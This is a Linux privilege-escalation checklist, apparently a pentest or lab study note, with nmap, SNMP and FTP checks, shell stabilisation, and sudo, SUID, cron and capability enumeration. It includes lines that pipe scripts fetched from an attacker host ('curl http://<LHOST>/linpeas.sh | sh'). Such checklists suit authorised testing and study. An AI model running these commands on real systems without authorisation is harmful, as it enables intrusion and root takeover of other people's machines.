---
title: Linux Checklist
type: checklist
tab: Checklists
target: Linux
tags: [Linux, Checklist, Enumeration, PrivilegeEscalation]
---

# Linux Checklist

## Goal

Move from initial foothold to a privilege escalation path by checking system context, service clues, automated enum output, and high-yield manual checks.

## Flow

- [ ] Run basic port/service discovery.
- [ ] Check service-specific quick wins such as SNMP or FTP.
- [ ] Stabilize the shell.
- [ ] Run automated enum.
- [ ] Manually review sudo, SUID/SGID, cron, writable files, capabilities, groups, and kernel.

## Initial Foothold

### Nmap

```sh
# Fast full TCP scan.
nmap -p- --min-rate 1000 -T4 <TARGET_IP> -oN nmap_ports.txt

# Extract ports and run a detailed scan.
ports=$(grep open nmap_ports.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p$ports <TARGET_IP> -oN nmap_detail.txt

# Quick UDP checks.
sudo nmap -sU --top-ports 10 <TARGET_IP>
sudo nmap -sU --top-ports 50 <TARGET_IP>
```

### If Found SNMP

```sh
# Enumerate community strings and basic SNMP data.
onesixtyone -c <COMMUNITY_LIST> <TARGET_IP>
snmp-check -c public <TARGET_IP>
snmpwalk -v2c -c public <TARGET_IP>
```

### If Found FTP

```sh
# Try anonymous/default FTP access.
ftp <TARGET_IP>
# user: ftp
# pass: ftp
```

## Post-Exploitation / Privilege Escalation

### Shell Stabilization

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Automated Enum

```sh
# LinPEAS.
curl http://<LHOST>/linpeas.sh | sh

# Linux Smart Enumeration.
curl http://<LHOST>/lse.sh | sh -s -- -l 1

# pspy for root processes and cron jobs.
./pspy64
```

### High-Yield Manual Checks

- [ ] Check `sudo -l`, then GTFOBins for allowed binaries.
- [ ] Check SUID/SGID binaries, then GTFOBins or PATH hijack potential.
- [ ] Check cron jobs and writable scripts run by root.
- [ ] Check writable files, especially `/etc/passwd`, scripts, and backup paths.
- [ ] Check capabilities with `getcap`.
- [ ] Check NFS `no_root_squash`.
- [ ] Check Docker/LXD group access.
- [ ] Treat kernel exploits as a last resort.

```sh
id
whoami
hostname
uname -a
cat /etc/passwd

# Sudo.
sudo -l

# SUID/SGID.
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
find / -perm -2000 -type f 2>/dev/null | xargs ls -la

# Capabilities.
getcap -r / 2>/dev/null

# Cron.
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Writable paths.
ls -la /etc/passwd
ls -la /opt /var/www /home/*

# Kernel.
uname -r
```

## Done When

- You know the current user, groups, sudo rights, SUID/SGID candidates, cron jobs, writable paths, capabilities, and kernel version.
- You have at least one concrete privesc hypothesis or a reason to move to credential hunting.
